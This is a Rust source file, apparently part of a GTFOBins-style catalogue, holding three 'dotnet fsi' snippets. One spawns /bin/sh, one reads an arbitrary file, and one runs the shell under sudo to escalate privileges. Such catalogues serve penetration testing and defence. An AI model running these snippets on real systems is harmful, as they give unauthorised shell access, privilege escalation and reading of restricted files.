
pub static BIN_NAME: &'static str = "dotnet";
pub static SH_CODE: &'static str = r#"
    
    dotnet fsi
    System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
"#;
pub static FR_CODE: &'static str = r#"
    
    export LFILE=file_to_read
    dotnet fsi
    System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable("LFILE"));;
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo dotnet fsi
    System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
